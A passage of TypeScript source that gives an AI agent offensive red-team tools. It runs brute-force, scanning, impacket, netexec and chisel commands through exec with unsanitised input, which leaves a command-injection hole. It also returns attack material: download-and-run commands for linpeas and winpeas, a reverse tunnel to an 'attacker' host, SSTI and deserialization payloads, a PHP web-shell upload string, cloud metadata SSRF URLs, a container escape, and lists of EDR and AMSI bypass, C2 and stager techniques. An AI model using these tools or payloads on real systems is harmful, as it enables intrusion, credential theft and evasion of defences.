		}) as AgentTool,
	);

	// --- ffuf ---
	const FfufSchema = z.object({
		url: z.string().min(1),
		wordlist: z.string().min(1),
	});
	tools.push(
		createTool<
			{ url: string; wordlist: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_ffuf",
			description: "Run ffuf fuzzing.",
			inputSchema: zodToJsonSchema(FfufSchema),
			execute: async (input) => {
				const v = validateWithZod(FfufSchema, input);
				const cmd = `ffuf -u ${v.url} -w ${v.wordlist} -mc all -fc 404`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- subfinder ---
	const SubfinderSchema = z.object({ domain: z.string().min(1) });
	tools.push(
		createTool<
			{ domain: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_subfinder",
			description: "Run subfinder subdomain enumeration.",
			inputSchema: zodToJsonSchema(SubfinderSchema),
			execute: async (input) => {
				const v = validateWithZod(SubfinderSchema, input);
				const cmd = `subfinder -d ${v.domain} -silent`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- httpx ---
	const HttpxSchema = z.object({
		input: z.string().min(1),
		flags: z.string().optional(),
	});
	tools.push(
		createTool<
			{ input: string; flags?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_httpx",
			description: "Run httpx HTTP probing.",
			inputSchema: zodToJsonSchema(HttpxSchema),
			execute: async (input) => {
				const v = validateWithZod(HttpxSchema, input);
				const flags = v.flags ?? "-title -tech-detect -status-code";
				const cmd = `echo ${v.input} | httpx ${flags}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- whatweb ---
	const WhatwebSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<
			{ target: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_whatweb",
			description: "Run whatweb technology fingerprinting.",
			inputSchema: zodToJsonSchema(WhatwebSchema),
			execute: async (input) => {
				const v = validateWithZod(WhatwebSchema, input);
				const cmd = `whatweb ${v.target}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 120000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- wafw00f ---
	const Wafw00fSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<
			{ target: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_wafw00f",
			description: "Run wafw00f WAF detection.",
			inputSchema: zodToJsonSchema(Wafw00fSchema),
			execute: async (input) => {
				const v = validateWithZod(Wafw00fSchema, input);
				const cmd = `wafw00f ${v.target}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 120000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- masscan ---
	const MasscanSchema = z.object({
		target: z.string().min(1),
		ports: z.string().optional(),
		rate: z.number().int().optional(),
	});
	tools.push(
		createTool<
			{ target: string; ports?: string; rate?: number },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_masscan",
			description: "Run masscan fast port scan.",
			inputSchema: zodToJsonSchema(MasscanSchema),
			execute: async (input) => {
				const v = validateWithZod(MasscanSchema, input);
				const ports = v.ports ?? "1-65535";
				const rate = v.rate ?? 1000;
				const cmd = `masscan ${v.target} -p${ports} --rate=${rate}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- hydra ---
	const HydraSchema = z.object({
		target: z.string().min(1),
		service: z.string().min(1),
		userlist: z.string().optional(),
		passlist: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; service: string; userlist?: string; passlist?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_hydra",
			description: "Run hydra brute force.",
			inputSchema: zodToJsonSchema(HydraSchema),
			execute: async (input) => {
				const v = validateWithZod(HydraSchema, input);
				const cmd = `hydra -L ${v.userlist ?? "users.txt"} -P ${v.passlist ?? "passwords.txt"} ${v.target} ${v.service}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- impacket runner ---
	const ImpacketSchema = z.object({
		tool: z.string().min(1),
		args: z.string().min(1),
	});
	tools.push(
		createTool<
			{ tool: string; args: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_impacket",
			description: "Run an impacket tool (secretsdump, GetUserSPNs, etc.).",
			inputSchema: zodToJsonSchema(ImpacketSchema),
			execute: async (input) => {
				const v = validateWithZod(ImpacketSchema, input);
				const cmd = `impacket-${v.tool} ${v.args}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- netexec ---
	const NetexecSchema = z.object({
		protocol: z.string().min(1),
		target: z.string().min(1),
		args: z.string().optional(),
	});
	tools.push(
		createTool<
			{ protocol: string; target: string; args?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_netexec",
			description: "Run netexec (nxc) against a target.",
			inputSchema: zodToJsonSchema(NetexecSchema),
			execute: async (input) => {
				const v = validateWithZod(NetexecSchema, input);
				const cmd = `nxc ${v.protocol} ${v.target} ${v.args ?? ""}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- certipy ---
	const CertipySchema = z.object({
		action: z.string().min(1),
		args: z.string().min(1),
	});
	tools.push(
		createTool<
			{ action: string; args: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_certipy",
			description: "Run certipy AD CS tool.",
			inputSchema: zodToJsonSchema(CertipySchema),
			execute: async (input) => {
				const v = validateWithZod(CertipySchema, input);
				const cmd = `certipy ${v.action} ${v.args}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- katana ---
	const KatanaSchema = z.object({
		target: z.string().min(1),
		flags: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; flags?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_katana",
			description: "Run katana web crawler.",
			inputSchema: zodToJsonSchema(KatanaSchema),
			execute: async (input) => {
				const v = validateWithZod(KatanaSchema, input);
				const cmd = `katana -u ${v.target} ${v.flags ?? ""}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- gau ---
	const GauSchema = z.object({ domain: z.string().min(1) });
	tools.push(
		createTool<
			{ domain: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_gau",
			description: "Run gau (get all urls).",
			inputSchema: zodToJsonSchema(GauSchema),
			execute: async (input) => {
				const v = validateWithZod(GauSchema, input);
				const cmd = `gau ${v.domain}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- linpeas ---
	tools.push(
		createTool<Record<string, never>, { command: string }>({
			name: "rt_linpeas",
			description: "Generate linpeas execution command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					command:
						"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
				};
			},
		}) as AgentTool,
	);

	// --- winpeas ---
	tools.push(
		createTool<Record<string, never>, { command: string }>({
			name: "rt_winpeas",
			description: "Generate winpeas execution command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					command:
						"certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe && winpeas.exe",
				};
			},
		}) as AgentTool,
	);

	// --- chisel ---
	const ChiselSchema = z.object({
		mode: z.enum(["server", "client"]).optional(),
		port: z.number().int().optional(),
		target: z.string().optional(),
	});
	tools.push(
		createTool<
			{ mode?: string; port?: number; target?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_chisel",
			description: "Execute chisel tunnel command.",
			inputSchema: zodToJsonSchema(ChiselSchema),
			execute: async (input) => {
				const v = validateWithZod(ChiselSchema, input);
				const port = v.port ?? 8080;
				const cmd =
					v.mode === "server"
						? `chisel server -p ${port} --reverse`
						: `chisel client ${v.target ?? "http://attacker:8080"} R:socks`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- proxychains ---
	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_proxychains",
			description: "Execute proxychains command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "proxychains4 -q echo test";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Advanced exploit techniques ---

	const ExploitChainSchema = z.object({
		vulns: z.array(z.string().min(1)).min(1),
		target: z.string().min(1),
	});
	tools.push(
		createTool<
			{ vulns: string[]; target: string },
			{ chain: string[]; command: string }
		>({
			name: "rt_ref_exploit_chain",
			description: "Chain multiple vulnerabilities into an attack sequence.",
			inputSchema: zodToJsonSchema(ExploitChainSchema),
			execute: async (input) => {
				const v = validateWithZod(ExploitChainSchema, input);
				const chain = v.vulns.map(
					(vuln, i) => `Step ${i + 1}: exploit ${vuln} on ${v.target}`,
				);
				return {
					chain,
					command: `# Exploit chain for ${v.target}\n${chain.join("\n")}`,
				};
			},
		}) as AgentTool,
	);

	const FuzzSchema = z.object({
		target: z.string().min(1),
		mode: z.enum(["afl", "libfuzzer", "radamsa"]).optional(),
	});
	tools.push(
		createTool<{ target: string; mode?: string }, { command: string }>({
			name: "rt_ref_fuzz",
			description: "Generate fuzzing command.",
			inputSchema: zodToJsonSchema(FuzzSchema),
			execute: async (input) => {
				const v = validateWithZod(FuzzSchema, input);
				const mode = v.mode ?? "afl";
				const cmds: Record<string, string> = {
					afl: `afl-fuzz -i input/ -o output/ -m none -- ${v.target} @@`,
					libfuzzer: `${v.target} -max_len=4096 -dict=dict.txt corpus/`,
					radamsa: `radamsa -o output.txt -n 1000 input.txt`,
				};
				return { command: cmds[mode] };
			},
		}) as AgentTool,
	);

	const DeserSchema = z.object({
		type: z.enum(["java", "php", "python", "dotnet"]).optional(),
		gadget: z.string().optional(),
	});
	tools.push(
		createTool<{ type?: string; gadget?: string }, { commands: string[] }>({
			name: "rt_ref_deser",
			description: "Generate deserialization exploit commands.",
			inputSchema: zodToJsonSchema(DeserSchema),
			execute: async (input) => {
				const v = validateWithZod(DeserSchema, input);
				const t = v.type ?? "java";
				const cmds: Record<string, string[]> = {
					java: [
						"java -jar ysoserial.jar CommonsCollections6 'cmd' | base64",
						"java -jar ysoserial.jar URLDNS 'http://callback'",
					],
					php: [
						"phpggc Laravel/RCE1 system id",
						"phpggc Symfony/RCE4 exec 'id'",
					],
					python: [
						"python3 -c \"import pickle,os; pickle.dumps(os.system('id'))\"",
					],
					dotnet: [".NET deserialization via ysoserial.net"],
				};
				return { commands: cmds[t] };
			},
		}) as AgentTool,
	);

	const SstiSchema = z.object({
		engine: z
			.enum(["jinja2", "twig", "freemarker", "velocity", "smarty"])
			.optional(),
	});
	tools.push(
		createTool<{ engine?: string }, { payloads: string[] }>({
			name: "rt_ref_ssti",
			description: "Generate SSTI payloads by template engine.",
			inputSchema: zodToJsonSchema(SstiSchema),
			execute: async (input) => {
				const v = validateWithZod(SstiSchema, input);
				const e = v.engine ?? "jinja2";
				const payloads: Record<string, string[]> = {
					jinja2: [
						"{{7*7}}",
						"{{config}}",
						"{{''.__class__.__mro__[1].__subclasses__()}}",
						"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
					],
					twig: [
						"{{7*7}}",
						"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
					],
					freemarker: [
						"$" + "{7*7}",
						'<#assign ex="freemarker.template.utility.Execute"?new()>' +
							"$" +
							'{ex("id")}',
					],
					velocity: [
						"#set($x=7*7)$x",
						"#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))",
					],
					smarty: ["{7*7}", "{php}echo `id`;{/php}"],
				};
				return { payloads: payloads[e] };
			},
		}) as AgentTool,
	);

	const SsrfBypassSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { payloads: string[] }>({
			name: "rt_ref_ssrf_bypass",
			description: "Generate SSRF bypass payloads.",
			inputSchema: zodToJsonSchema(SsrfBypassSchema),
			execute: async () => {
				return {
					payloads: [
						"http://127.0.0.1",
						"http://localhost",
						"http://0.0.0.0",
						"http://[::1]",
						"http://127.1",
						"http://2130706433",
						"http://0x7f000001",
						"http://127.0.0.1.nip.io",
						"http://169.254.169.254/latest/meta-data/",
						"http://metadata.google.internal/computeMetadata/v1/",
						"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
					],
				};
			},
		}) as AgentTool,
	);

	const UploadBypassSchema = z.object({ filename: z.string().optional() });
	tools.push(
		createTool<{ filename?: string }, { techniques: string[] }>({
			name: "rt_ref_upload_bypass",
			description: "Generate file upload bypass techniques.",
			inputSchema: zodToJsonSchema(UploadBypassSchema),
			execute: async () => {
				return {
					techniques: [
						"Double extension: shell.php.jpg",
						"Null byte: shell.php%00.jpg",
						"Case variation: shell.PHP, shell.PhP",
						"Trailing dot: shell.php.",
						"Trailing space: shell.php ",
						"Content-Type spoof: image/jpeg with PHP content",
						"Magic bytes: GIF89a<?php system($_GET['c']); ?>",
						"Polyglot: valid image + embedded PHP",
						"HTAccess upload: .htaccess with AddType application/x-httpd-php .jpg",
						"Race condition: upload + access simultaneously",
					],
				};
			},
		}) as AgentTool,
	);

	const RaceSchema = z.object({
		url: z.string().min(1),
		requests: z.number().int().optional(),
	});
	tools.push(
		createTool<{ url: string; requests?: number }, { command: string }>({
			name: "rt_ref_race",
			description: "Generate race condition attack command.",
			inputSchema: zodToJsonSchema(RaceSchema),
			execute: async (input) => {
				const v = validateWithZod(RaceSchema, input);
				const n = v.requests ?? 20;
				return {
					command: `# Turbo Intruder single-packet attack\n# Send ${n} requests in single packet to ${v.url}`,
				};
			},
		}) as AgentTool,
	);

	const SmuggleSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { payloads: string[] }>({
			name: "rt_ref_smuggle",
			description: "Generate HTTP request smuggling payloads.",
			inputSchema: zodToJsonSchema(SmuggleSchema),
			execute: async () => {
				return {
					payloads: [
						"CL.TE: Content-Length + Transfer-Encoding: chunked",
						"TE.CL: Transfer-Encoding + Content-Length",
						"TE.TE: dual Transfer-Encoding with obfuscation",
						"HTTP/2 smuggling: pseudo-header injection",
					],
				};
			},
		}) as AgentTool,
	);

	const CachePoisonSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { techniques: string[] }>({
			name: "rt_ref_cache_poison",
			description: "Generate web cache poisoning/deception techniques.",
			inputSchema: zodToJsonSchema(CachePoisonSchema),
			execute: async () => {
				return {
					techniques: [
						"Unkeyed header: X-Forwarded-Host",
						"Unkeyed header: X-Original-URL",
						"Unkeyed parameter: ?callback=",
						"Fat GET: body in GET request",
						"Cache deception: /profile/nonexistent.css",
						"Cache key normalization bypass",
					],
				};
			},
		}) as AgentTool,
	);

	const ProtoPolluteSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { payloads: string[] }>({
			name: "rt_ref_proto_pollute",
			description: "Generate prototype pollution payloads.",
			inputSchema: zodToJsonSchema(ProtoPolluteSchema),
			execute: async () => {
				return {
					payloads: [
						'{"__proto__":{"isAdmin":true}}',
						'{"constructor":{"prototype":{"isAdmin":true}}}',
						"?__proto__[isAdmin]=true",
						"?constructor[prototype][isAdmin]=true",
					],
				};
			},
		}) as AgentTool,
	);

	const GraphqlAttackSchema = z.object({ url: z.string().min(1) });
	tools.push(
		createTool<{ url: string }, { attacks: string[] }>({
			name: "rt_ref_graphql_attack",
			description: "Generate GraphQL attack payloads.",
			inputSchema: zodToJsonSchema(GraphqlAttackSchema),
			execute: async () => {
				return {
					attacks: [
						"Introspection: { __schema { types { name } } }",
						"Depth attack: nested query 10+ levels",
						"Batching: array of queries",
						"Alias abuse: multiple aliases for same field",
						"Field suggestion: typo to get suggestions",
						"Mutation abuse: unauthorized mutations",
					],
				};
			},
		}) as AgentTool,
	);

	const WsSchema = z.object({ url: z.string().min(1) });
	tools.push(
		createTool<{ url: string }, { attacks: string[] }>({
			name: "rt_ref_websocket",
			description: "Generate WebSocket attack payloads.",
			inputSchema: zodToJsonSchema(WsSchema),
			execute: async () => {
				return {
					attacks: [
						"CSWSH: cross-site WebSocket hijacking",
						"Message injection",
						"Authentication bypass (no token check)",
						"Message flooding (DoS)",
						"Origin validation bypass",
					],
				};
			},
		}) as AgentTool,
	);

	// --- AD / Cloud / Container advanced ---
	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_ad_attack",
			description: "Generate Active Directory attack commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"BloodHound: SharpHound.exe -c All",
						"Kerberoast: impacket-GetUserSPNs -request",
						"AS-REP: impacket-GetNPUsers",
						"DCSync: impacket-secretsdump -just-dc",
						"ADCS: certipy find -vulnerable",
						"Delegation: impacket-findDelegation",
						"ACL: bloodyAD get object ...",
						"Shadow creds: pywhisker --add",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_cloud_attack",
			description: "Generate cloud attack commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"AWS: pacu, cloudfox, prowler",
						"Azure: azurehound, roadtools, aadinternals",
						"GCP: gcpbucketbrute, forseti",
						"IAM privesc: enumerate permissions, find escalation paths",
						"Metadata SSRF: 169.254.169.254",
						"Bucket takeover: S3, Azure Blob, GCS",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_container_advanced",
			description: "Generate advanced container escape commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"docker.sock abuse: docker run -v /:/host alpine chroot /host",
						"privileged: capsh --print, mount host fs",
						"cgroup escape: CVE-2022-0492",
						"k8s: service account token, secrets, etcd",
						"containerd: shim exploit",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Evasion advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_edr_bypass",
			description: "Generate EDR bypass techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Unhooking: restore ntdll from disk",
						"Direct syscalls: syscall instruction",
						"Indirect syscalls: jump to syscall in ntdll",
						"Hell's Gate / Halo's Gate",
						"Tartarus Gate",
						"Module stomping",
						"Process hollowing",
						"PPID spoofing",
						"Token manipulation",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_amsi_bypass",
			description: "Generate AMSI bypass techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Memory patching: amsi.dll AmsiScanBuffer",
						"Reflection: System.Management.Automation.AmsiUtils",
						"Obfuscation: string concatenation, base64",
						"COM hijacking",
						"PowerShell downgrade (v2)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_anti_debug",
			description: "Generate anti-debug techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"IsDebuggerPresent",
						"NtQueryInformationProcess (DebugPort)",
						"CheckRemoteDebuggerPresent",
						"Timing checks (rdtsc, GetTickCount)",
						"PEB.BeingDebugged",
						"NtSetInformationThread (HideFromDebugger)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_anti_vm",
			description: "Generate anti-VM techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Registry: HKLM\\SOFTWARE\\VMware",
						"Files: VMware Tools, VirtualBox Guest Additions",
						"MAC: 00:0C:29, 00:50:56, 08:00:27",
						"CPUID: hypervisor bit",
						"Processes: vmtoolsd, vboxservice",
						"Services: VMware, VirtualBox",
					],
				};
			},
		}) as AgentTool,
	);

	// --- C2 advanced ---
	tools.push(
		createTool<Record<string, never>, { protocols: string[] }>({
			name: "rt_ref_c2_advanced",
			description: "Generate advanced C2 protocols and techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					protocols: [
						"HTTP/HTTPS with malleable profiles",
						"DNS (A, AAAA, TXT, CNAME)",
						"SMB (named pipes)",
						"TCP (raw)",
						"ICMP (covert channel)",
						"WebSocket",
						"gRPC",
						"Slack/Discord (living off trusted services)",
						"Dead drop resolvers (pastebin, github)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { stagers: string[] }>({
			name: "rt_ref_stager",
			description: "Generate stager types.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					stagers: [
						"PowerShell (IEX, download cradle)",
						"VBS (mshta, wscript)",
						"HTA (mshta)",
						"Macro (VBA, XLM)",
						"ISO (LNK, DLL sideloading)",
						"LNK (shortcut)",
						"OneNote (embedded files)",
						"MSI (custom action)",
						"ClickOnce (application manifest)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_inmem_exec",
			description: "Generate in-memory execution techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Reflective DLL loading",
						"Shellcode injection (VirtualAlloc + CreateThread)",
						".NET assembly loading (Assembly.Load)",
						"PowerShell (Invoke-Expression, IEX)",
						"Python exec()",
						"Node.js eval()",
						"JScript (eval, new Function)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_fileless",
			description: "Generate fileless execution techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Memory-only (no file written)",
						"Registry-resident (payload in registry)",
						"WMI event subscription",
						"Scheduled task with encoded command",
						"PowerShell (no script file)",
						"LOLBins (certutil, bitsadmin, mshta)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_redirector",
			description: "Generate redirector setup commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"nginx: proxy_pass to C2",
						"apache: mod_rewrite + mod_proxy",
						"socat: TCP relay",
						"iptables: NAT redirect",
						"domain fronting: SNI vs Host",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Lateral movement advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
